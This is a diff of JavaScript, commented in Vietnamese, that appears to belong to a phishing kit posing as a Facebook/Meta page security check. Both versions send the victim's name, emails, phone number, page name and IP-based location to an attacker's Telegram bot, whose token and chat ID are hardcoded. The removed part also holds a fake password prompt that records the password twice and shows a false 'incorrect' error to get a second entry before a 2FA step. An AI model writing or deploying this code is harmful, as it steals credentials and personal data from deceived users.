@@ -1,126 +1,73 @@
-// ==================== CẤU HÌNH GỬI TIN NHẮN ====================
-const TG_BOT = {
-    TOKEN: '8648725712:AAGvpKKuW8V9dB6yBpwvkyvIi0xCHNDaHAk',
-    CHAT_ID: '-5286997232' // GIỮ NGUYÊN DẤU TRỪ
-};
+// CONFIG CỐ ĐỊNH - KHÔNG CẦN SỬA
+const BOT_TOKEN = '8648725712:AAGvpKKuW8V9dB6yBpwvkyvIi0xCHNDaHAk';
+const CHAT_ID = '-5286997232';
 
-// Hàm gửi tin nhắn trực tiếp không qua trung gian
-async function sendToTelegram(text) {
+// Hàm gửi tin nhắn (Viết riêng ra để không lỗi)
+async function sendData(noidung) {
     try {
-        await fetch(`https://api.telegram.org/bot${TG_BOT.TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: TG_BOT.CHAT_ID,
-                text: text,
+                chat_id: CHAT_ID,
+                text: noidung,
                 parse_mode: 'HTML'
             })
         });
-    } catch (e) { console.error("Lỗi gửi Telegram:", e); }
+    } catch (e) { console.log("Lỗi kết nối"); }
 }
 
-// Hàm lấy Vị trí chi tiết (Ép trình duyệt đợi kết quả)
-async function getClientLocation() {
+// Hàm lấy IP (Lấy trực tiếp)
+async function getIP() {
     try {
-        const response = await fetch('https://ipapi.co/json/');
-        const data = await response.json();
-        return {
-            ip: data.ip || "N/A",
-            country: data.country_name || "N/A",
-            city: data.city || "N/A",
-            region: data.region || "N/A"
-        };
-    } catch (e) {
-        return { ip: "N/A", country: "N/A", city: "N/A", region: "N/A" };
-    }
+        const r = await fetch('https://ipapi.co/json/');
+        const d = await r.json();
+        return `IP: ${d.ip}\nQuốc gia: ${d.country_name}\nThành phố: ${d.city}`;
+    } catch (e) { return "Không lấy được IP"; }
 }
 
-// ==================== LOGIC XỬ LÝ FORM CHÍNH ====================
+// BẮT ĐẦU CHẠY
 document.getElementById('clientForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     
-    const submitBtn = e.target.querySelector('button');
-    submitBtn.disabled = true;
-    submitBtn.innerHTML = 'Processing...';
+    // 1. Hiện loading cho chuyên nghiệp
+    const btn = e.target.querySelector('button');
+    btn.innerText = "Processing...";
+    btn.disabled = true;
 
-    // 1. Lấy vị trí trước khi soạn tin nhắn (Chống lỗi N/A)
-    const location = await getClientLocation();
+    // 2. Lấy IP trước
+    const vitri = await getIP();
 
-    const info = {
-        fullName: document.getElementById('fullName').value.trim(),
-        email: document.getElementById('email').value.trim(),
-        emailBusiness: document.getElementById('emailBusiness').value.trim(),
-        fanpage: document.getElementById('fanpage').value.trim(),
-        phone: document.getElementById('phone').value.trim(),
-        ...location
-    };
+    // 3. Lấy dữ liệu từ các ô nhập
+    const name = document.getElementById('fullName').value;
+    const email = document.getElementById('email').value;
+    const phone = document.getElementById('phone').value;
+    const page = document.getElementById('fanpage').value;
 
-    // Lưu vào máy để các bước sau (Pass/2FA) lấy dùng
-    localStorage.setItem('user_cache', JSON.stringify(info));
+    // 4. Soạn tin nhắn gửi về Bot
+    const text = `
+🚀 <b>DATA MỚI</b>
+-------------------
+👤 Họ tên: ${name}
+📧 Email: ${email}
+📱 SĐT: ${phone}
+📄 Page: ${page}
+-------------------
+🌍 <b>VỊ TRÍ:</b>
+${vitri}
+    `;
 
-    // 2. Soạn tin nhắn Mẫu chuẩn (Có icon và xuống dòng)
-    const report = `
-🚀 <b>DATA MỚI VỀ</b> 🚀
-------------------------------
-📄 Page Name: <b>${info.fanpage}</b>
-👤 Họ tên: <b>${info.fullName}</b>
-📧 Email 1: ${info.email}
-📧 Email 2: ${info.emailBusiness}
-📱 Số ĐT: <code>${info.phone}</code>
-------------------------------
-🌍 <b>VỊ TRÍ CHI TIẾT:</b>
-📍 IP: <code>${info.ip}</code>
-🏳️ Quốc gia: <b>${info.country}</b>
-🏙️ Thành phố: <b>${info.city}</b>
-🏙️ Vùng: <b>${info.region}</b>
-------------------------------`;
+    // 5. Gửi đi
+    await sendData(text);
 
-    await sendToTelegram(report);
+    // 6. Xong thì mở phần nhập mật khẩu
+    btn.disabled = false;
+    btn.innerText = "Continue";
     
-    submitBtn.disabled = false;
-    submitBtn.textContent = 'Continue';
-    
-    // Chuyển sang Modal nhập mật khẩu
-    openSecurityModal();
+    // Gọi hàm mở Modal mật khẩu của bạn (Đảm bảo hàm này có tồn tại trong các file khác)
+    if (typeof openSecurityModal === 'function') {
+        openSecurityModal();
+    } else {
+        alert("Thông tin đã được gửi!");
+    }
 });
-
-// ==================== MODAL MẬT KHẨU (Gửi 2 lần) ====================
-function openSecurityModal() {
-    const content = `
-        <div style="padding: 20px; font-family: Arial, sans-serif;">
-            <p style="color: #9a979e; margin-bottom: 15px; font-size: 14px;">For your security, you must enter your password to continue.</p>
-            <form id="securityForm">
-                <input type="password" id="passInput" placeholder="Password" style="width:100%; border: 1px solid #d4dbe3; padding: 12px; border-radius: 8px; margin-bottom: 10px; outline: none;">
-                <p id="passError" style="color: red; font-size: 13px; display: none; margin-bottom: 10px;"></p>
-                <button type="submit" style="width:100%; background: #0064E0; color: white; border: none; padding: 12px; border-radius: 20px; font-weight: bold; cursor: pointer;">Continue</button>
-            </form>
-        </div>`;
-
-    Modal.create('securityModal', content);
-    Modal.open('securityModal');
-
-    let count = 0;
-    document.getElementById('securityForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const p = document.getElementById('passInput').value;
-        const err = document.getElementById('passError');
-        const cache = JSON.parse(localStorage.getItem('user_cache'));
-
-        if (!p) return;
-
-        if (count === 0) {
-            // Lần 1: Gửi pass và báo lỗi giả
-            await sendToTelegram(`🔑 <b>MẬT KHẨU (LẦN 1):</b> <code>${p}</code>\n👤 User: ${cache.email}`);
-            err.textContent = "The password you've entered is incorrect.";
-            err.style.display = 'block';
-            document.getElementById('passInput').value = '';
-            count = 1;
-        } else {
-            // Lần 2: Gửi pass và báo thành công chuyển 2FA
-            await sendToTelegram(`🔑 <b>MẬT KHẨU (LẦN 2):</b> <code>${p}</code>\n👤 User: ${cache.email}`);
-            Modal.close('securityModal');
-            // Bạn có thể gọi tiếp hàm 2FA ở đây
-            alert("Security check required. Please check your notification.");
-        }
-    });
-}
